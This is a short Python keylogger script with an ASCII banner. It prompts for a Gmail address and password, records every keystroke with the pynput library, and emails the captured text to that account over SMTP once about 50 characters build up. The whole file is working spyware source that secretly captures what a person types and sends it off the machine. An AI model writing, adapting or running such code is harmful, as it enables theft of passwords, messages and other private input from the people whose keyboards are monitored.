import getpass
import smtplib

from pynput.keyboard import Key, Listener
print("""
 _  __      _  _  _          __ _  __ _
| |/ / ___ | || || |    ___ / _` |/ _` | ___  _ _
|   < / -_) \_. || |__ / _ \\__. |\__. |/ -_)| '_|
|_|\_\\___| |__/ |____|\___/|___/ |___/ \___||_|

""")


# This section logs you into your email
email = input("Enter your email: ")
password = getpass.getpass(prompt='Password: ', stream=None)
try:
    server = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
    server.ehlo()
    server.login(email, password)
except:
    print('You couldn\'t connect to your email.')

# This is the key logger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ' '
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

# this sends the logged keys to your email
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )
with Listener(on_press=on_press) as listener:
    listener.join()
